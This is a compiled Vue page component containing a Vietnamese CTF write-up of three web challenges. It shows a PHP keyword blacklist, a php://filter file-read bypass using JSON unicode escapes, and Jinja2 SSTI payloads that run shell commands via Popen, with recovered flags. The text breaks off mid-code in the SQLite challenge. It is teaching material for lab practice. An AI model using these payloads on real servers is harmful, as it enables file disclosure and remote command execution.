import { _ as _export_sfc, r as resolveComponent, c as createElementBlock, a as createStaticVNode, b as createVNode, d as withCtx, e as createBaseVNode, f as createTextVNode, o as openBlock } from "./app-BJjiZhLy.js";
const _sfc_main = {};
const _hoisted_1 = {
  href: "https://hackmd.io/@d0qbu/HJoJxEK-a#WEB-thru-the-filter",
  target: "_blank",
  rel: "noopener noreferrer"
};
const _hoisted_2 = { class: "custom-container info" };
const _hoisted_3 = {
  href: "https://uithcm-my.sharepoint.com/:u:/g/personal/23520385_ms_uit_edu_vn/EVHsVm4QZ4xAgcivw2md5PsBiVX5J-6yMeDy1BVXzgT37w?e=a937rn",
  target: "_blank",
  rel: "noopener noreferrer"
};
function _sfc_render(_ctx, _cache) {
  const _component_CodeGroupItem = resolveComponent("CodeGroupItem");
  const _component_CodeGroup = resolveComponent("CodeGroup");
  const _component_ExternalLinkIcon = resolveComponent("ExternalLinkIcon");
  return openBlock(), createElementBlock("div", null, [
    _cache[8] || (_cache[8] = createStaticVNode('<h2 id="web-warmup-php" tabindex="-1"><a class="header-anchor" href="#web-warmup-php"><span>WEB: Warmup PHP</span></a></h2><div class="custom-container info"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"></circle><path d="M12 8h.01"></path><path d="M11 12h1v4h1"></path></g></svg><p class="custom-container-title">Challenge</p><p>Let&#39;s get started. Try to read flag at root directory.</p><blockquote><p><code>http://45.122.249.68:20021</code></p></blockquote></div>', 2)),
    createVNode(_component_CodeGroup, null, {
      default: withCtx(() => [
        createVNode(_component_CodeGroupItem, { title: "index.php" }, {
          default: withCtx(() => _cache[0] || (_cache[0] = [
            createBaseVNode("div", {
              class: "language-php line-numbers-mode",
              "data-highlighter": "prismjs",
              "data-ext": "php",
              "data-title": "php"
            }, [
              createBaseVNode("pre", null, [
                createBaseVNode("code", null, [
                  createBaseVNode("span", { class: "line" }, [
                    createBaseVNode("span", { class: "token php language-php" }, [
                      createBaseVNode("span", { class: "token delimiter important" }, "<?php")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createBaseVNode("span", { class: "token function" }, "error_reporting"),
                      createBaseVNode("span", { class: "token punctuation" }, "("),
                      createBaseVNode("span", { class: "token number" }, "0"),
                      createBaseVNode("span", { class: "token punctuation" }, ")"),
                      createBaseVNode("span", { class: "token punctuation" }, ";")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createBaseVNode("span", { class: "token function" }, "show_source"),
                      createBaseVNode("span", { class: "token punctuation" }, "("),
                      createBaseVNode("span", { class: "token constant" }, "__FILE__"),
                      createBaseVNode("span", { class: "token punctuation" }, ")"),
                      createBaseVNode("span", { class: "token punctuation" }, ";")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createBaseVNode("span", { class: "token keyword" }, "function"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token function-definition function" }, "check_valid"),
                      createBaseVNode("span", { class: "token punctuation" }, "("),
                      createBaseVNode("span", { class: "token variable" }, "$str"),
                      createBaseVNode("span", { class: "token punctuation" }, ")")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createBaseVNode("span", { class: "token punctuation" }, "{")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("    "),
                      createBaseVNode("span", { class: "token variable" }, "$blacklist"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token operator" }, "="),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token punctuation" }, "["),
                      createBaseVNode("span", { class: "token string single-quoted-string" }, "'php'"),
                      createBaseVNode("span", { class: "token punctuation" }, ","),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token string single-quoted-string" }, "'file'"),
                      createBaseVNode("span", { class: "token punctuation" }, ","),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token string single-quoted-string" }, "'glob'"),
                      createBaseVNode("span", { class: "token punctuation" }, ","),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token string single-quoted-string" }, "'data'"),
                      createBaseVNode("span", { class: "token punctuation" }, ","),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token string single-quoted-string" }, "'http'"),
                      createBaseVNode("span", { class: "token punctuation" }, ","),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token string single-quoted-string" }, "'zip'"),
                      createBaseVNode("span", { class: "token punctuation" }, ","),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token string single-quoted-string" }, "'zlib'"),
                      createBaseVNode("span", { class: "token punctuation" }, ","),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token string single-quoted-string" }, "'phar'"),
                      createBaseVNode("span", { class: "token punctuation" }, ","),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token string single-quoted-string" }, "'W1'"),
                      createBaseVNode("span", { class: "token punctuation" }, "]"),
                      createBaseVNode("span", { class: "token punctuation" }, ";")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("    "),
                      createBaseVNode("span", { class: "token variable" }, "$pattern"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token operator" }, "="),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token string single-quoted-string" }, "'/'"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token operator" }, "."),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token function" }, "implode"),
                      createBaseVNode("span", { class: "token punctuation" }, "("),
                      createBaseVNode("span", { class: "token string single-quoted-string" }, "'|'"),
                      createBaseVNode("span", { class: "token punctuation" }, ","),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token variable" }, "$blacklist"),
                      createBaseVNode("span", { class: "token punctuation" }, ")"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token operator" }, "."),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token string single-quoted-string" }, "'/i'"),
                      createBaseVNode("span", { class: "token punctuation" }, ";")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("    "),
                      createBaseVNode("span", { class: "token keyword" }, "if"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token punctuation" }, "("),
                      createBaseVNode("span", { class: "token function" }, "preg_match"),
                      createBaseVNode("span", { class: "token punctuation" }, "("),
                      createBaseVNode("span", { class: "token variable" }, "$pattern"),
                      createBaseVNode("span", { class: "token punctuation" }, ","),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token variable" }, "$str"),
                      createBaseVNode("span", { class: "token punctuation" }, ","),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token variable" }, "$matches"),
                      createBaseVNode("span", { class: "token punctuation" }, ")"),
                      createBaseVNode("span", { class: "token punctuation" }, ")"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token punctuation" }, "{")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("        "),
                      createBaseVNode("span", { class: "token keyword" }, "return"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token constant boolean" }, "false"),
                      createBaseVNode("span", { class: "token punctuation" }, ";")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("    "),
                      createBaseVNode("span", { class: "token punctuation" }, "}")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("    "),
                      createBaseVNode("span", { class: "token keyword" }, "return"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token constant boolean" }, "true"),
                      createBaseVNode("span", { class: "token punctuation" }, ";")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createBaseVNode("span", { class: "token punctuation" }, "}")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createBaseVNode("span", { class: "token keyword" }, "if"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token punctuation" }, "("),
                      createBaseVNode("span", { class: "token variable" }, "$_SERVER"),
                      createBaseVNode("span", { class: "token punctuation" }, "["),
                      createBaseVNode("span", { class: "token string single-quoted-string" }, "'REQUEST_METHOD'"),
                      createBaseVNode("span", { class: "token punctuation" }, "]"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token operator" }, "==="),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token string single-quoted-string" }, "'POST'"),
                      createBaseVNode("span", { class: "token punctuation" }, ")"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token punctuation" }, "{")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("    "),
                      createBaseVNode("span", { class: "token variable" }, "$body"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token operator" }, "="),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token function" }, "file_get_contents"),
                      createBaseVNode("span", { class: "token punctuation" }, "("),
                      createBaseVNode("span", { class: "token string single-quoted-string" }, "'php://input'"),
                      createBaseVNode("span", { class: "token punctuation" }, ")"),
                      createBaseVNode("span", { class: "token punctuation" }, ";")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("    "),
                      createBaseVNode("span", { class: "token variable" }, "$json"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token operator" }, "="),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token function" }, "json_decode"),
                      createBaseVNode("span", { class: "token punctuation" }, "("),
                      createBaseVNode("span", { class: "token variable" }, "$body"),
                      createBaseVNode("span", { class: "token punctuation" }, ","),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token constant boolean" }, "true"),
                      createBaseVNode("span", { class: "token punctuation" }, ")"),
                      createBaseVNode("span", { class: "token punctuation" }, ";")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("    "),
                      createBaseVNode("span", { class: "token keyword" }, "if"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token punctuation" }, "("),
                      createBaseVNode("span", { class: "token variable" }, "$json"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token operator" }, "==="),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token constant" }, "null"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token operator" }, "&&"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token function" }, "json_last_error"),
                      createBaseVNode("span", { class: "token punctuation" }, "("),
                      createBaseVNode("span", { class: "token punctuation" }, ")"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token operator" }, "!=="),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token constant" }, "JSON_ERROR_NONE"),
                      createBaseVNode("span", { class: "token punctuation" }, ")"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token punctuation" }, "{")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("        "),
                      createBaseVNode("span", { class: "token function" }, "header"),
                      createBaseVNode("span", { class: "token punctuation" }, "("),
                      createBaseVNode("span", { class: "token string single-quoted-string" }, "'Content-Type: application/json'"),
                      createBaseVNode("span", { class: "token punctuation" }, ")"),
                      createBaseVNode("span", { class: "token punctuation" }, ";")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("        "),
                      createBaseVNode("span", { class: "token keyword" }, "echo"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token function" }, "json_encode"),
                      createBaseVNode("span", { class: "token punctuation" }, "("),
                      createBaseVNode("span", { class: "token punctuation" }, "["),
                      createBaseVNode("span", { class: "token string single-quoted-string" }, "'error'"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token operator" }, "=>"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token string single-quoted-string" }, "'Invalid JSON'"),
                      createBaseVNode("span", { class: "token punctuation" }, "]"),
                      createBaseVNode("span", { class: "token punctuation" }, ")"),
                      createBaseVNode("span", { class: "token punctuation" }, ";")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("        "),
                      createBaseVNode("span", { class: "token keyword" }, "exit"),
                      createBaseVNode("span", { class: "token punctuation" }, ";")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("    "),
                      createBaseVNode("span", { class: "token punctuation" }, "}")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("    "),
                      createBaseVNode("span", { class: "token keyword" }, "if"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token punctuation" }, "("),
                      createBaseVNode("span", { class: "token keyword" }, "isset"),
                      createBaseVNode("span", { class: "token punctuation" }, "("),
                      createBaseVNode("span", { class: "token variable" }, "$json"),
                      createBaseVNode("span", { class: "token punctuation" }, ")"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token operator" }, "&&"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token keyword" }, "isset"),
                      createBaseVNode("span", { class: "token punctuation" }, "("),
                      createBaseVNode("span", { class: "token variable" }, "$json"),
                      createBaseVNode("span", { class: "token punctuation" }, "["),
                      createBaseVNode("span", { class: "token string single-quoted-string" }, "'page'"),
                      createBaseVNode("span", { class: "token punctuation" }, "]"),
                      createBaseVNode("span", { class: "token punctuation" }, ")"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token operator" }, "&&"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token function" }, "check_valid"),
                      createBaseVNode("span", { class: "token punctuation" }, "("),
                      createBaseVNode("span", { class: "token variable" }, "$body"),
                      createBaseVNode("span", { class: "token punctuation" }, ")"),
                      createBaseVNode("span", { class: "token punctuation" }, ")"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token punctuation" }, "{")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("        "),
                      createBaseVNode("span", { class: "token variable" }, "$page"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token operator" }, "="),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token variable" }, "$json"),
                      createBaseVNode("span", { class: "token punctuation" }, "["),
                      createBaseVNode("span", { class: "token string single-quoted-string" }, "'page'"),
                      createBaseVNode("span", { class: "token punctuation" }, "]"),
                      createBaseVNode("span", { class: "token punctuation" }, ";")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("        "),
                      createBaseVNode("span", { class: "token variable" }, "$content"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token operator" }, "="),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token function" }, "file_get_contents"),
                      createBaseVNode("span", { class: "token punctuation" }, "("),
                      createBaseVNode("span", { class: "token variable" }, "$page"),
                      createBaseVNode("span", { class: "token punctuation" }, ")"),
                      createBaseVNode("span", { class: "token punctuation" }, ";")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("        "),
                      createBaseVNode("span", { class: "token keyword" }, "if"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token punctuation" }, "("),
                      createBaseVNode("span", { class: "token operator" }, "!"),
                      createBaseVNode("span", { class: "token variable" }, "$content"),
                      createBaseVNode("span", { class: "token punctuation" }, ")"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token punctuation" }, "{")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("            "),
                      createBaseVNode("span", { class: "token variable" }, "$content"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token operator" }, "="),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token string double-quoted-string" }, '"Not found"'),
                      createBaseVNode("span", { class: "token punctuation" }, ";")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("        "),
                      createBaseVNode("span", { class: "token punctuation" }, "}"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token keyword" }, "else"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token punctuation" }, "{")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("            "),
                      createBaseVNode("span", { class: "token keyword" }, "if"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token punctuation" }, "("),
                      createBaseVNode("span", { class: "token operator" }, "!"),
                      createBaseVNode("span", { class: "token function" }, "check_valid"),
                      createBaseVNode("span", { class: "token punctuation" }, "("),
                      createBaseVNode("span", { class: "token variable" }, "$content"),
                      createBaseVNode("span", { class: "token punctuation" }, ")"),
                      createBaseVNode("span", { class: "token punctuation" }, ")"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token punctuation" }, "{")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("                "),
                      createBaseVNode("span", { class: "token variable" }, "$content"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token operator" }, "="),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token string double-quoted-string" }, '"Invalid content"'),
                      createBaseVNode("span", { class: "token punctuation" }, ";")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("            "),
                      createBaseVNode("span", { class: "token punctuation" }, "}")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("        "),
                      createBaseVNode("span", { class: "token punctuation" }, "}")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("    "),
                      createBaseVNode("span", { class: "token punctuation" }, "}"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token keyword" }, "else"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token punctuation" }, "{")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("        "),
                      createBaseVNode("span", { class: "token variable" }, "$content"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token operator" }, "="),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token string double-quoted-string" }, '"Invalid request"'),
                      createBaseVNode("span", { class: "token punctuation" }, ";")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("    "),
                      createBaseVNode("span", { class: "token punctuation" }, "}")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("    "),
                      createBaseVNode("span", { class: "token function" }, "header"),
                      createBaseVNode("span", { class: "token punctuation" }, "("),
                      createBaseVNode("span", { class: "token string single-quoted-string" }, "'Content-Type: application/json'"),
                      createBaseVNode("span", { class: "token punctuation" }, ")"),
                      createBaseVNode("span", { class: "token punctuation" }, ";")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createTextVNode("    "),
                      createBaseVNode("span", { class: "token keyword" }, "echo"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token function" }, "json_encode"),
                      createBaseVNode("span", { class: "token punctuation" }, "("),
                      createBaseVNode("span", { class: "token punctuation" }, "["),
                      createBaseVNode("span", { class: "token string single-quoted-string" }, "'content'"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token operator" }, "=>"),
                      createTextVNode(),
                      createBaseVNode("span", { class: "token variable" }, "$content"),
                      createBaseVNode("span", { class: "token punctuation" }, "]"),
                      createBaseVNode("span", { class: "token punctuation" }, ")"),
                      createBaseVNode("span", { class: "token punctuation" }, ";")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, [
                      createBaseVNode("span", { class: "token punctuation" }, "}")
                    ]),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" })
                  ])
                ])
              ]),
              createBaseVNode("div", {
                class: "line-numbers",
                "aria-hidden": "true",
                style: { "counter-reset": "line-number 0" }
              }, [
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" })
              ])
            ], -1)
          ])),
          _: 1
        })
      ]),
      _: 1
    }),
    _cache[9] || (_cache[9] = createStaticVNode('<p>Server sẽ lấy input từ <code>POST</code> request gửi đến, và gọi hàm <code>file_get_contents</code>. Ta thử đọc file <code>/flag</code></p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">Request: {&quot;page&quot;:&quot;/flag&quot;}</span>\n<span class="line">---------</span>\n<span class="line">Response: {&quot;content&quot;:&quot;Invalid content&quot;}</span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Vì content của file <code>/flag</code> có chứa <code>W1</code> nên cần phải encode content của file để có thể in ra thành công. Trong quá trình reserach thì mình có tìm ra PHP Wrapper có thể encode nội dung của file như sau</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">php://filter/convert.base64-encode/resource=/flag</span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>Tuy nhiên <code>php</code> đã bị filter. JSON có escape character đặc biệt là <code>\\uXXXX</code> là unicode của UTF-16. Do PHP không có nên khi kiểm tra <code>check_valid($body)</code> sẽ không nhận ra điều gì bất thường. Qua hàm <code>json_decode()</code> nó sẽ được decode và đọc.</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">Request: {&quot;page&quot;:&quot;\\u0070\\u0068\\u0070://filter/convert.base64-encode/resource=/flag&quot;}</span>\n<span class="line">---------</span>\n<span class="line">Response: {&quot;content&quot;:&quot;VzF7dzNsYzBtM193M2JfdzRycmowcnN9Cg==&quot;}</span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Decode basễ và ra flag.</p><p><strong>FLAG:</strong> <code>W1{w3lc0m3_w3b_w4rrj0rs}</code><br></p><h2 id="web-namename" tabindex="-1"><a class="header-anchor" href="#web-namename"><span>WEB: NAMENAME</span></a></h2><div class="custom-container info"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"></circle><path d="M12 8h.01"></path><path d="M11 12h1v4h1"></path></g></svg><p class="custom-container-title">Challenge</p><p>I tried coding a website to say hello to everyone, please try and feel it</p><blockquote><p><code>http://45.122.249.68:20029/</code></p></blockquote></div><p><code>Ctrl U</code> xem src thấy có đường dẫn đến <code>/wannaw1n</code>. Web sẽ trỏ đến <code>/wannaw1n?c=hacker</code> và trả về</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">Hello hacker</span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>Đây có thể là render template nên mình nghĩ đến SSTI. Sau một hồi thử thì mình xác định được đây là từ <code>Python/Jinja2</code> Đây là payload ban đầu mình dùng class <code>Popen</code> để sử dụng lệnh <code>cat</code> đọc file flag</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">{{&quot;&quot;.__class__.__mro__&quot;[1].__subclasses__()[279](&quot;cat flag.txt&quot;,shell=1,stdout=-1).communicate()}}</span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div>', 14)),
    createBaseVNode("p", null, [
      _cache[2] || (_cache[2] = createStaticVNode("Tuy nhiên trong quá trình thử thì có phát hiện ra server đã filter một số kí tự như là <code>.</code>, <code>[</code>, <code>]</code>, <code>f</code>, <code>\\</code>. Do đó cần chỉnh sửa một chút về payload, và chuyển sang read toàn bộ các file trong directory hiện tại với <code>cat *</code> hoặc có thể dùng <code>cat *lag*</code>, <code>cat ?lag????</code> vì chữ flag không hoàn toàn bị filter. Chi tiết có thể xem qua ", 17)),
      createBaseVNode("a", _hoisted_1, [
        _cache[1] || (_cache[1] = createTextVNode("đây")),
        createVNode(_component_ExternalLinkIcon)
      ])
    ]),
    _cache[10] || (_cache[10] = createStaticVNode('<div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">{{&quot;&quot;|attr(&quot;__class__&quot;)|attr(&quot;__mro__&quot;)|attr(&quot;__getitem__&quot;)(1)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(279)(&quot;cat+*&quot;,shell=1,stdout=-1)|attr(&quot;communicate&quot;)()}}</span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><strong>FLAG:</strong> <code>W1{U_are_master_in_SSTI}</code><br></p><h2 id="web-solite" tabindex="-1"><a class="header-anchor" href="#web-solite"><span>WEB: Solite</span></a></h2>', 3)),
    createBaseVNode("div", _hoisted_2, [
      _cache[5] || (_cache[5] = createStaticVNode('<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"></circle><path d="M12 8h.01"></path><path d="M11 12h1v4h1"></path></g></svg><p class="custom-container-title">Challenge</p><p>Recon carefully so as not to miss anything</p>', 3)),
      createBaseVNode("blockquote", null, [
        _cache[4] || (_cache[4] = createBaseVNode("p", null, [
          createBaseVNode("code", null, "http://45.122.249.68:20020/")
        ], -1)),
        createBaseVNode("p", null, [
          createBaseVNode("a", _hoisted_3, [
            _cache[3] || (_cache[3] = createTextVNode("solite.zip")),
            createVNode(_component_ExternalLinkIcon)
          ])
        ])
      ])
    ]),
    _cache[11] || (_cache[11] = createStaticVNode('<p>Server sử dụng SQLite3, tạo 2 tables API và flag.</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line">db<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></span>\n<span class="line">    db<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token string">&#39;CREATE TABLE API (id INTEGER PRIMARY KEY, joke TEXT)&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"></span>\n<span class="line">    <span class="token keyword">const</span> stmt <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">&#39;INSERT INTO API (id, joke) VALUES (?, ?)&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token keyword">const</span> 